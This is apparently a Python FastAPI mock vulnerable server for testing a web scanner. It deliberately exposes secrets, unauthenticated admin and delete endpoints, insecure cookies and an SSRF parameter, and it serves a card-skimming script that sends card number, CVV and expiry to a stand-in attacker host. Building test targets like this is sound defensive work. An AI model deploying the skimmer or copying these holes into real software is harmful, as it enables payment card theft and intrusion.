"""
WebGuard Mock Vulnerable Target Server
======================================
FastAPI server on port 9999 exposing various vulnerabilities and configuration flaws,
including API spec issues, stack traces, and Magecart skimmer content.
Used for local scanner testing and validation.
"""

import uvicorn
from fastapi import FastAPI, Response
from fastapi.responses import HTMLResponse

app = FastAPI(openapi_url=None)

@app.get("/", response_class=HTMLResponse)
def home():
    content = """
    <html>
    <head>
        <title>Mock Vulnerable Web Target</title>
        <!-- Mock external scripts for SRI and Magecart auditing -->
        <script src="/static/drift_script.js"></script>
    </head>
    <body>
        <h1>Welcome to the Mock Target Server</h1>
        <p>This server exposes deliberate misconfigurations for scanning validation.</p>
        <ul>
            <li>Sensitive File exposure at <a href="/.env">/.env</a></li>
            <li>Directory Listing enabled at <a href="/uploads/">/uploads/</a></li>
            <li>Insecure cookies at <a href="/set-insecure-cookie">/set-insecure-cookie</a></li>
            <li>Robots.txt file at <a href="/robots.txt">/robots.txt</a></li>
            <li>OpenAPI spec at <a href="/openapi.json">/openapi.json</a></li>
        </ul>
    </body>
    </html>
    """
    headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Credentials": "true",
        "Server": "Apache/2.4.41 (Ubuntu)",
        "X-Powered-By": "PHP/7.4.3"
    }
    return HTMLResponse(content=content, headers=headers)

@app.get("/.env")
def get_env():
    env_content = """
    DB_HOST=127.0.0.1
    DB_USER=admin_db
    DB_PASSWORD=SuperSecretPassword123!
    API_KEY=sk_live_51Nz82mHlKsoP2
    JWT_SECRET=super_secret_jwt_sign_key_9982
    """
    headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Credentials": "true"
    }
    return Response(content=env_content, media_type="text/plain", headers=headers)

@app.get("/uploads/", response_class=HTMLResponse)
def uploads_listing():
    content = """
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
    <html>
     <head>
      <title>Index of /uploads</title>
     </head>
     <body>
    <h1>Index of /uploads</h1>
      <table>
       <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th>Name</th><th>Last modified</th><th>Size</th></tr>
       <tr><td valign="top"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td></tr>
       <tr><td valign="top"></td><td><a href="backup.zip">backup.zip</a></td><td align="right">2026-07-13 14:00  </td><td align="right">1.2M</td></tr>
      </table>
    </body></html>
    """
    return HTMLResponse(content=content)

@app.get("/robots.txt")
def get_robots():
    robots_content = """
    User-agent: *
    Disallow: /admin
    Disallow: /wp-admin
    """
    return Response(content=robots_content, media_type="text/plain")

@app.get("/set-insecure-cookie")
def set_insecure_cookie():
    response = Response(content="Insecure session cookie set.")
    response.set_cookie(
        key="session_id",
        value="5f8d9b23-a1c6-4b28-b0a7-68b201633d9c",
        httponly=False,
        secure=False,
        samesite=None
    )
    return response

# ---- Week 6 New Auditing Target Paths ----

@app.get("/static/drift_script.js")
def get_drift_script():
    # Return a script matching card-skimming keywords to trigger Magecart warnings
    js_content = """
    console.log("Loading checkout client helpers...");
    function collectBillingDetails() {
        var card_number = document.getElementById("cc-number").value;
        var cvv = document.getElementById("cc-cvv").value;
        var expiry = document.getElementById("cc-expiry").value;
        
        var payload = "c=" + card_number + "&v=" + cvv + "&e=" + expiry;
        
        // Exfiltration route
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://malicious-gateway-skimmer.com/log", true);
        xhr.send(payload);
    }
    """
    return Response(content=js_content, media_type="application/javascript")
 
@app.get("/api/user")
def get_api_user(id: str = None):
    # If fuzz is triggered, return a mock stack trace
    if id and ("'" in id or "<" in id or "\\" in id):
        error_content = """
        java.lang.NullPointerException: Cannot invoke "String.length()" because "id" is null
            at com.mysql.jdbc.Driver.connect(Driver.java:342)
            at org.hibernate.engine.jdbc.connections.internal.BasicConnectionCreator.makeConnection(BasicConnectionCreator.java:75)
            at org.hibernate.engine.jdbc.connections.internal.BasicConnectionCreator.createConnection(BasicConnectionCreator.java:53)
        """
        return Response(content=error_content, status_code=500, media_type="text/plain")
    return {"id": "123", "username": "guest_user", "role": "reader"}

@app.post("/api/user/delete")
def delete_api_user():
    # Sensitive action endpoint lacking authorization requirement
    return {"status": "success", "message": "User delete request processed."}

@app.get("/api/users/{id}")
def get_api_user_by_id(id: str):
    # Return different payloads with sensitive properties to test BOLA & Excessive Data Exposure (API1 & API3)
    if id == "1":
        return {
            "id": "1",
            "username": "alice",
            "email": "alice@company.com",
            "role": "admin",
            "password_hash": "e10adc3949ba59abbe56e057f20f883e",
            "ssn": "000-12-3456"
        }
    elif id == "2":
        return {
            "id": "2",
            "username": "bob",
            "email": "bob@company.com",
            "role": "user"
        }
    return {"id": id, "username": "unknown_user", "role": "guest"}

@app.get("/api/admin/users")
def get_admin_users():
    # Admin function level auth bypass (API5)
    return [
        {"id": "1", "username": "alice", "role": "admin"},
        {"id": "2", "username": "bob", "role": "user"}
    ]

@app.post("/api/checkout")
def checkout_sensitive_flow():
    # Sensitive business flow with no rate limit (API6)
    return {"status": "success", "message": "Checkout completed successfully.", "transaction_id": "tx_99281"}

@app.get("/api/v1/status")
def legacy_api_status():
    # Legacy/deprecated API endpoint version (API9)
    return {"status": "success", "version": "v1.0-legacy", "support": "deprecated"}

@app.get("/openapi.json")
def get_openapi_spec():
    # Valid OpenAPI v3 spec mapping the API routes with deliberate OWASP flaws
    spec = {
        "openapi": "3.0.0",
        "info": {
            "title": "Mock Vulnerable API Spec",
            "version": "1.0.0"
        },
        "servers": [
            {"url": "http://127.0.0.1:9999"}
        ],
        "components": {
            "securitySchemes": {
                "InsecureQueryKey": {
                    "type": "apiKey",
                    "name": "api_key",
                    "in": "query",
                    "description": "Insecure API Key passed in query parameter (API2 check target)"
                }
            }
        },
        "paths": {
            "/api/user": {
                "get": {
                    "summary": "Retrieve user details",
                    "parameters": [
                        {
                            "name": "id",
                            "in": "query",
                            "required": False,
                            "schema": {"type": "string"}
                        }
                    ],
                    "responses": {
                        "200": {"description": "Successful retrieval"}
                    }
                },
                "post": {
                    "summary": "Update user",
                    "requestBody": {
                        "content": {
                            "application/json": {
                                "schema": {
                                    "type": "object",
                                    "properties": {
                                        "username": {"type": "string"}
                                    },
                                    "additionalProperties": True
                                }
                            }
                        }
                    },
                    "responses": {
                        "200": {"description": "User updated"}
                    }
                }
            },
            "/api/user/delete": {
                "post": {
                    "summary": "Delete user",
                    "responses": {
                        "200": {"description": "User deleted"}
                    }
                }
            },
            "/api/users/{id}": {
                "get": {
                    "summary": "Get user by ID (BOLA Target)",
                    "parameters": [
                        {
                            "name": "id",
                            "in": "path",
                            "required": True,
                            "schema": {"type": "string"}
                        }
                    ],
                    "responses": {
                        "200": {"description": "User details"}
                    }
                }
            },
            "/api/admin/users": {
                "get": {
                    "summary": "Get all users (BFLA Target)",
                    "responses": {
                        "200": {"description": "List of users"}
                    }
                }
            },
            "/api/checkout": {
                "post": {
                    "summary": "Process checkout (Sensitive Flow Target)",
                    "parameters": [
                        {
                            "name": "target_url",
                            "in": "query",
                            "required": False,
                            "schema": {"type": "string"},
                            "description": "Callback target URL (SSRF Target)"
                        }
                    ],
                    "responses": {
                        "200": {"description": "Checkout status"}
                    }
                }
            }
        }
    }
    return spec

if __name__ == "__main__":
    import os
    port = int(os.getenv("MOCK_PORT", "9999"))
    print(f"Starting Mock Vulnerable Target Server on http://127.0.0.1:{port}")
    uvicorn.run(app, host="127.0.0.1", port=port)
